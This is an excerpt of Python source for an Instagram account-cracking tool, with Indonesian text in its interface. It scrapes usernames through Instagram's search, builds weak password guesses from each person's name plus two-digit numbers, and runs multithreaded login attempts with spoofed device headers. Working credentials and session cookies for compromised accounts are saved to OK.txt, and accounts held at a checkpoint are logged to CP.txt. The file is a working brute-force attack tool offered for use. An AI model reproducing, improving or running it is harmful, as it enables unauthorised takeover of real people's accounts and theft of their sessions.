...
def searchnama(cookie):
    try:
        ...
        for ba in range(500):
            x = requests.get(
                f'https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={nama}&rank_token=0.35875757839675004&include_reel=true',
                cookies=cookie,
                headers={
                    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 269.0.0.18.75 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
                }
            )
            ...
            try:
                for i in x_jason['users']:
                    ...
                    data = f'{username}<<=>>{fullname}'
                    if data not in fanids:
                        fanids.append(data)
...
def apsw():
    ...
    with iniapabree:
       with ThreadPoolExec(max_workers=35) as fanky86:
          for i in fanids:
             username, password = i.split('<<=>>')
             apacobabg = generate(password.lower())
             fanky86.submit(threads, username, apacobabg)
...
def generate(name):
    ...
    for y in name.split(' '):
        ...
        for i in range(1, 11):
            angka = str(i).zfill(2)
            xxx.append(y + angka)
            xxx.append(f'{y.capitalize()}{angka}')
    return xxx
...
def convert_cookie(item):
    try:
        ...
        ig_nrcb = 'ig_nrcb=' + re.findall(r'ig_nrcb=(\d+)', str(item))[0] if 'ig_nrcb=' in str(item) else 'ig_nrcb=1'
        dpr    = 'dpr=' + re.findall(r'dpr=([^;]+)', str(item))[0] if 'dpr=' in str(item) else 'dpr=2'
        mid    = 'mid=' + re.findall(r'mid=([^;]+)', str(item))[0] if 'mid=' in str(item) else ''
        rur    = 'rur=' + re.findall(r'rur=([^;]+)', str(item))[0] if 'rur=' in str(item) else ''
        fanky = f'{csrft}; {ds_id}; {sesid}; {ig_nrcb}; {dpr}; {mid}; {rur}'
    except Exception as e:
        fanky = 'cookies tidak di temukan, error saat convert'
    return fanky
...
def threads(username, password):
    ...
    for password in password:
        try:
            ...
            headers = {"user-agent": fanuaig(),"x-ig-app-id": "238260118697367","x-asbd-id": "198387","x-ig-www-claim": "0","x-ig-device-id": "android-8df7a98acb3a44e1","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept-language": "id-ID"}
            data = {"username": username,"enc_password": enc_password,"queryParams": "{}","optIntoOneTap": "false","device_id": "android-8df7a98acb3a44e1","from_reg": "false","login_attempt_count": "0"}
            ...
            if 'logged_in_user' in res_json:
                 ...
                 user_panel = Panel.fit(f"👤 {username}\n🔑 {password}", border_style="green", title="CREDENTIAL")
                 tree.add(user_panel)
                 info_text = f"🔠 Full Name : {user.get('full_name', '-')}\n🆔 FB ID     : {user.get('fbid_v2', '-')}\n📝 Lencana   : {user.get('is_verified', '-')}\n🔒 Private   : {user.get('is_private')}"
                 info_panel = Panel.fit(info_text, border_style="cyan", title="INFORMASI")
                 tree.add(info_panel)
                 stats_text = f"👥 {followers} Followers\n👣 {following} Following"
                 stats_panel = Panel.fit(stats_text, border_style="blue", title="STATISTIK")
                 tree.add(stats_panel)
                 tree.add(f"[yellow]🧭 UA: {ua}[/yellow]")
                 tree.add(f"[magenta]🔐 Cookie/Auth:\n{auth}[/magenta]")
                 tree.add("[bold white]🌐 Jangan lupa follow GitHub saya: [underline blue]https://github.com/fanky86[/underline blue][/bold white]")
                 tree.add("[bold white]📷 Dan follow juga Instagram saya: [underline magenta]https://instagram.com/fannjha[/underline magenta][/bold white]")
                 prints(tree)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,password,followers,following,auth))
                 sv.close()
                 break
                 ...
                 stats_panel = Panel.fit(stats_text, border_style="blue", title="STATISTIK")
                 tree.add(stats_panel)
                 note_panel = Panel.fit("⚠️ Akun terkena checkpoint / verifikasi tambahan", border_style="bright_red", title="PERINGATAN")
                 tree.add(note_panel)
                 prints(tree)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s\n'%(username,password,followers,following))
                 sv.close()
                 break
